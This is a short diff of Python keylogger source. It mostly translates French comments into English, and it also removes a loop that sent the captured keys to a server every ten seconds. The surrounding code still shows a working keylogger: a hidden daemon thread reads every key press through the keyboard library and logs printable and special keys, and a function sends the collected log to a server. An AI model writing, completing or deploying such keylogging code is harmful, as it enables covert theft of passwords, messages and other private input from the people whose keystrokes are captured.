@@ -10,18 +10,18 @@ def log_keystrokes():
     """
     while True:
         event = keyboard.read_event()
-        if event.event_type == "down":  # Capture uniquement la pression sur une touche
+        if event.event_type == "down":  # Capture only when key pressed
             key = event.name
             if key == "space":
                 key_log.append(" ")
-            elif len(key) == 1:  # Si c'est un caractère imprimable
+            elif len(key) == 1:  # regular char
                 key_log.append(key)
-            else:  # Pour les touches spéciales
+            else:  # special keys
                 key_log.append(f" [{key}] ")
 
 def send_keylogs(data_stream):
     """
-    Send captured keys to a server.
+    Send captured keys to the server.
     """
     if key_log:
         logs = "".join(key_log)
@@ -34,11 +34,7 @@ def start_keylogger(data_stream):
     """
     Initialize the keylogger in a separate thread.
     """
-    # Lancer la capture des frappes dans un thread séparé
+    # Launch key capture in a separate thread
     keylogger_thread = threading.Thread(target=log_keystrokes, daemon=True)
     keylogger_thread.start()
     
-    # Simulation d'envoi régulier des données
-    while True:
-        send_keylogs(data_stream)
-        time.sleep(10)  # Envoi toutes les 10 secondes
